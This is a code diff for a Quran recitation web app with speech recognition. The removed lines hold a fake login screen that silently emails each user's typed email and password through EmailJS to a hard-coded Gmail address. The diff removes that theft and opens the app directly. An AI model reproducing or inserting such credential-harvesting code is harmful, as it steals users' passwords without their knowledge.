@@ -6,28 +6,20 @@
     <title>المصحف الذكي - Fast Pro</title>
     <link href="https://fonts.googleapis.com/css2?family=Amiri:wght@400;700&display=swap" rel="stylesheet">
     
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-    <script type="text/javascript">
-       (function(){
-          emailjs.init("dilvEcwO_XTFsbzIw");
-       })();
-    </script>
-
     <style>
         :root { --bg-color: #fffbf2; --border-color: #d4af37; --highlight-color: #27ae60; }
         body { font-family: 'Amiri', serif; background-color: #f8f9fa; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
         
-        #app-container { display: none; }
+        /* دەرکەوتنی ڕاستەوخۆی ئەپەکە */
+        #app-container { display: flex; }
 
         .main-container { width: 100%; max-width: 700px; background-color: var(--bg-color); border: 2px solid var(--border-color); border-radius: 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); display: flex; flex-direction: column; height: 95vh; position: relative; }
-        .header { background: white; padding: 10px; border-bottom: 2px solid var(--border-color); text-align: center; border-radius: 15px 15px 0 0; display: flex; justify-content: space-between; align-items: center; padding-left: 20px; padding-right: 20px;}
         
-        select { font-family: 'Amiri', serif; font-size: 18px; padding: 8px; width: 60%; border: 1px solid var(--border-color); border-radius: 8px; outline: none; background: #fff; }
+        /* دەستکاری هەدەرەکە کرا بۆ ئەوەی بەبێ بەکارهێنەر جوان دەرکەوێت */
+        .header { background: white; padding: 10px; border-bottom: 2px solid var(--border-color); text-align: center; border-radius: 15px 15px 0 0; display: flex; justify-content: center; align-items: center; padding-left: 20px; padding-right: 20px;}
         
-        .user-info { display: flex; align-items: center; gap: 10px; font-size: 14px; }
-        .user-avatar { width: 35px; height: 35px; border-radius: 50%; border: 1px solid var(--border-color); display: flex; justify-content: center; align-items: center; background: #eee; font-weight: bold; color: #555;}
-        .logout-btn { background: #c0392b; color: white; border: none; padding: 5px 12px; border-radius: 5px; cursor: pointer; font-size: 14px; font-family: 'Amiri', serif;}
-
+        select { font-family: 'Amiri', serif; font-size: 18px; padding: 8px; width: 80%; border: 1px solid var(--border-color); border-radius: 8px; outline: none; background: #fff; text-align: center; }
+        
         .quran-content { flex-grow: 1; padding: 20px; overflow-y: auto; text-align: justify; font-size: 30px; line-height: 2.8; scroll-behavior: smooth; }
         .ayah-container { display: inline; }
         .word { display: inline-block; padding: 2px 2px; border-radius: 4px; transition: all 0.1s ease; cursor: pointer; }
@@ -36,49 +28,18 @@
         .basmala { text-align: center; font-size: 24px; color: var(--border-color); margin-bottom: 15px; display: block; }
         .footer { background: white; padding: 10px; border-top: 1px solid #eee; border-radius: 0 0 15px 15px; display: flex; flex-direction: column; align-items: center; }
         
-        /* باشترکردنی دیزاینی کەپشنەکە بۆ ئەوەی خێرا دەرکەوێت */
         #live-caption { width: 95%; background-color: #f1f1f1; padding: 8px; border-radius: 8px; font-size: 16px; color: #333; margin-bottom: 10px; text-align: center; min-height: 30px; border: 1px solid #ddd; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
         
         button#mic-btn { background-color: var(--border-color); color: white; border: none; padding: 12px 40px; font-size: 18px; border-radius: 50px; cursor: pointer; font-family: 'Amiri', serif; display: flex; align-items: center; gap: 10px; box-shadow: 0 4px 10px rgba(212, 175, 55, 0.3); transition: background 0.3s; }
         button.listening { background-color: #e74c3c !important; animation: pulse 1.5s infinite; }
         
-        #login-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(135deg, #fdfbf1 0%, #d4af37 100%); display: flex; justify-content: center; align-items: center; z-index: 2000; overflow-y: auto; }
-        .login-box { background: white; padding: 40px; border-radius: 20px; text-align: center; width: 90%; max-width: 380px; box-shadow: 0 20px 50px rgba(0,0,0,0.2); }
-        .login-box h1 { color: #d4af37; margin-bottom: 10px; font-size: 32px; }
-        .login-box p { color: #777; margin-bottom: 20px; }
-        
-        .input-group { margin-bottom: 15px; text-align: right; }
-        .input-group input { width: 92%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; font-family: 'Amiri', serif; font-size: 16px; margin-bottom: 10px; }
-        
-        .btn-login { width: 100%; padding: 12px; background: #d4af37; color: white; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; font-weight: bold; transition: 0.3s; font-family: 'Amiri', serif; margin-top: 10px;}
-        .btn-login:hover { background: #b6962f; }
-
         @keyframes pulse { 0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(231, 76, 60, 0.7); } 70% { transform: scale(1.05); box-shadow: 0 0 0 10px rgba(231, 76, 60, 0); } 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(231, 76, 60, 0); } }
     </style>
 </head>
 <body>
 
-    <div id="login-screen">
-        <div class="login-box">
-            <h1>Login</h1>
-            <p>سەرەتا بچۆ ژوورەوە</p>
-            
-            <div class="input-group">
-                <input type="email" id="user-email" placeholder="ئیمەیڵ (Email)">
-                <input type="password" id="user-pass" placeholder="وشەی نهێنی (Password)">
-            </div>
-            <button class="btn-login" onclick="sendEmailAndLogin()">چوونەژوورەوە</button>
-            <p id="status-msg" style="font-size: 12px; margin-top: 10px; color: #888;"></p>
-        </div>
-    </div>
-
     <div class="main-container" id="app-container">
         <div class="header">
-            <div class="user-info">
-                <div id="user-avatar" class="user-avatar">👤</div>
-                <span id="user-name-display"></span>
-                <button class="logout-btn" onclick="logout()">دەرچوون</button>
-            </div>
             <select id="surahSelect" onchange="loadSurah(this.value)">
                 <option value="1" selected>1. سورة الفاتحة</option>
                 <option value="" disabled>جاری بارکردنی ئەوانی تر...</option>
@@ -96,61 +57,6 @@
     </div>
 
     <script>
-        const loginScreen = document.getElementById('login-screen');
-        const appContainer = document.getElementById('app-container');
-        const userEmailInput = document.getElementById('user-email');
-        const userPassInput = document.getElementById('user-pass');
-        const userNameDisplay = document.getElementById('user-name-display');
-        const userAvatar = document.getElementById('user-avatar');
-        const statusMsg = document.getElementById('status-msg');
-
-        const savedUser = localStorage.getItem('quranAppUserEmail');
-        if (savedUser) {
-            showApp(savedUser);
-        }
-
-        // --- چوونەژوورەوەی خێرا (Optimistic UI) ---
-        function sendEmailAndLogin() {
-            const email = userEmailInput.value.trim();
-            const password = userPassInput.value.trim();
-
-            if (!email || !password) {
-                alert("تکایە هەموو خانەکان پڕ بکەرەوە");
-                return;
-            }
-
-            // یەکسەر ئەپەکە بکەرەوە بێ ئەوەی چاوەڕێی ئیمەیڵ بکەیت
-            localStorage.setItem('quranAppUserEmail', email);
-            showApp(email);
-
-            // ئیمەیڵەکە لە باکگراوند دەنێرین
-            var templateParams = {
-                to_email: 'muhamadgyan30@gmail.com', 
-                user_email: email, 
-                message: "User Password: " + password 
-            };
-
-            emailjs.send('service_yw2iv3b', 'template_ga0xhjs', templateParams)
-                .then(function(response) {
-                    console.log('Email sent silently');
-                }, function(error) {
-                    console.log('Email failed silently', error);
-                });
-        }
-
-        function showApp(email) {
-            loginScreen.style.display = 'none';
-            appContainer.style.display = 'flex';
-            userNameDisplay.innerText = email.split('@')[0];
-            userAvatar.innerText = email.charAt(0).toUpperCase();
-            init(); 
-        }
-
-        function logout() {
-            localStorage.removeItem('quranAppUserEmail');
-            window.location.reload();
-        }
-
         // ==========================================
         // Quran App Logic (High Performance)
         // ==========================================
@@ -177,6 +83,9 @@
         const quranDisplay = document.getElementById('quran-display');
         const captionBox = document.getElementById('live-caption');
         const micBtn = document.getElementById('mic-btn');
+
+        // ڕاستەوخۆ فەنکشنەکە بانگ دەکەین
+        init();
 
         function init() {
             if(allAyahs.length === 0) {
@@ -219,7 +128,6 @@
                 renderSurah(surahNumber);
                 currentAyahIndex = 0;
                 prepareCurrentAyah();
-                // پێویست ناکات مایک بکوژێتەوە، بۆ ئەوەی خێرا بێت
                 if(isListening && recognition) {
                     // هیچ مەکە، با بەردەوام بێت
                 }
@@ -257,19 +165,13 @@
         }
 
         // --- پاککردنەوەی پێشکەوتووی قورئان (Advanced Normalization) ---
-        // ئەمە نهێنی خێرایی و وردی ناسینەوەکەیە
         function normalizeArabic(text) {
             if (!text) return "";
             return text
-                // لابردنی هەموو هێما قورئانییەکان و تەشکیلەکان بە یەکجار
                 .replace(/[^\u0621-\u064A\u0660-\u0669 ]/g, '') 
-                // یەکخستنی ئەلیفەکان
                 .replace(/(آ|إ|أ|ٱ|ﺁ|ﺃ|ﺇ|ﭐ)/g, 'ا')
-                // یەکخستنی تاء و هاء (زۆرجار لە وەقفدا دەبێتە هاء)
                 .replace(/(ة|ه)/g, 'ه')
-                // یەکخستنی یاء و ئەلیفی مەقصورە
                 .replace(/(ى|ي|ئ)/g, 'ي')
-                // یەکخستنی واو و هەمزەی سەر واو
                 .replace(/(ؤ|و)/g, 'و')
                 .replace(/\s+/g, ' ')
                 .trim();
@@ -278,7 +180,7 @@
         if ('webkitSpeechRecognition' in window) {
             recognition = new webkitSpeechRecognition();
             recognition.continuous = true;
-            recognition.interimResults = true; // ئەمە زۆر گرنگە بۆ خێرایی
+            recognition.interimResults = true; 
             recognition.lang = 'ar-SA';
             recognition.maxAlternatives = 1;
 
@@ -296,23 +198,20 @@
             };
 
             recognition.onresult = (event) => { 
-                // وەرگرتنی ئەنجامەکان بە شێوەیەکی خێرا (Real-time)
                 let transcript = '';
                 for (let i = event.resultIndex; i < event.results.length; ++i) {
                     transcript += event.results[i][0].transcript;
                 }
-                captionBox.innerText = transcript; // پیشاندانی خێرا
+                captionBox.innerText = transcript;
                 checkMatch(transcript); 
             };
         } else { alert("تکایە Google Chrome بەکاربهێنە"); }
 
         function checkMatch(spokenText) {
             if(currentAyahIndex >= allAyahs.length) return;
-            // لابردنی دیلەی 300ms بۆ خێرایی زیاتر
             
             let spokenClean = normalizeArabic(spokenText);
             
-            // سەیری 5 وشەی پێشەوە دەکات
             for (let i = 0; i < 5; i++) {
                 let indexToCheck = currentWordIndex + i;
                 if (indexToCheck >= currentWords.length) break;
@@ -320,15 +219,12 @@
                 let targetWordRaw = currentWords[indexToCheck];
                 let targetClean = normalizeArabic(targetWordRaw);
                 
-                // ئەگەر وشەکە دۆزرایەوە (تەنانەت بەشێکیشی)
                 if (spokenClean.includes(targetClean)) { 
-                    // هەموو وشەکانی پێشوو تا ئەمە پڕ بکەرەوە
                     for(let j = 0; j <= i; j++) activateWord(); 
                     return; 
                 }
             }
             
-            // پشکنینی تەواوی ئایەتەکە
             let remainingTextRaw = currentWords.slice(currentWordIndex).join(" ");
             let remainingTextClean = normalizeArabic(remainingTextRaw);
             if (remainingTextClean.length > 5 && spokenClean.includes(remainingTextClean)) {
@@ -347,7 +243,6 @@
         function resetAutoSkipTimer() {
             clearTimeout(autoSkipTimer);
             if(!isListening) return;
-            // کردم بە 4 چرکە بۆ خێرایی (دەتوانێت کەمتریش بکەیت)
             autoSkipTimer = setTimeout(() => {
                 if(isListening && currentAyahIndex < allAyahs.length && currentWordIndex < currentWords.length) {
                     activateWord(); 
@@ -373,7 +268,6 @@
                 prepareCurrentAyah();
             } else { 
                 captionBox.innerText = "دەچێتە سورەتی دواتر..."; 
-                // کاتی چاوەڕوانی بۆ گۆڕینی سورەت کەمکرایەوە
                 setTimeout(() => { 
                     let currentSurahId = parseInt(surahSelect.value); 
                     let nextSurahId = currentSurahId + 1; 
@@ -385,7 +279,7 @@
                         isListening = false; 
                         recognition.stop(); 
                     } 
-                }, 1000); // تەنها 1 چرکە
+                }, 1000); 
             }
         }
 
